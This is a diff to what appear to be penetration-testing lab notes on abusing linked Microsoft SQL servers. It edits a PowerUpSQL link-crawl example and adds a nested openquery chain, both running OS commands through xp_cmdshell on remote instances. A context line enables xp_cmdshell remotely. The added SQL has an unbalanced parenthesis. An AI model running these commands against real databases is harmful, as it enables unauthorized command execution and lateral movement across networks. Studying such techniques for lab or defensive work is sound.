@@ -53,7 +53,11 @@ EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"
 - Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
 
 ```powershell
-Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql
+Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'cmd /c set username'" -QueryTarget eu-sql
 ```
- 
+- From the initial SQL server, OS commands can be executed using nested link queries:
+```sql
+select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql.eu.eurocorp.local",''''select @@version as version;exec master..xp_cmdshell "powershell whoami)'''')'')') 
+```
+
 
